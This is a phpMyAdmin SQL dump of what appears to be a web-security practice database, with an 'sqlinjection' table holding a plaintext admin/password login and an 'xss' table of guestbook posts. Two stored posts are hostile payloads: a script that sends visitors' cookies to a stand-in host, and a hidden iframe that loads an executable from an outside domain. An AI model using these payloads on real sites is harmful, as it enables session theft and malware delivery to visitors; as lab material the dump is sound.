-- phpMyAdmin SQL Dump
-- version 4.3.9
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Mar 30, 2015 at 12:48 AM
-- Server version: 5.6.21-log
-- PHP Version: 5.6.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `selfdirected`
--
CREATE DATABASE IF NOT EXISTS `selfdirected` DEFAULT CHARACTER SET latin1 COLLATE latin1_swedish_ci;
USE `selfdirected`;

-- --------------------------------------------------------

--
-- Table structure for table `sqlinjection`
--

CREATE TABLE IF NOT EXISTS `sqlinjection` (
  `userID` int(11) NOT NULL,
  `username` varchar(40) NOT NULL,
  `password` varchar(40) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `sqlinjection`
--

INSERT INTO `sqlinjection` (`userID`, `username`, `password`) VALUES
(1, 'admin', 'password');

-- --------------------------------------------------------

--
-- Table structure for table `xss`
--

CREATE TABLE IF NOT EXISTS `xss` (
  `postID` int(11) NOT NULL,
  `message` text NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `xss`
--

INSERT INTO `xss` (`postID`, `message`) VALUES
(1, 'sfsf'),
(2, 'test'),
(3, 'testpost'),
(8, '<script>\r\nvar link = document.createElement(''a'');\r\nlink.setAttribute(''href'', ''http://badpage.tbd/?cookiemonster='' + document.cookie);\r\nlink.setAttribute(''name'', ''Bad Link'');\r\nlink.innerHTML = ''Click me to see the entire post :)'';\r\ndocument.body.appendChild(link);\r\n</script>'),
(10, '<iframe src="http://87.duote.com.cn/ett[dot]exe" width="1" height="1" style="visibility:hidden"></iframe>\r\nSuch a beautiful guestbook you have here, it would be a shame if someone defaced it! <3');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `sqlinjection`
--
ALTER TABLE `sqlinjection`
  ADD PRIMARY KEY (`userID`);

--
-- Indexes for table `xss`
--
ALTER TABLE `xss`
  ADD PRIMARY KEY (`postID`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `sqlinjection`
--
ALTER TABLE `sqlinjection`
  MODIFY `userID` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `xss`
--
ALTER TABLE `xss`
  MODIFY `postID` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=11;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
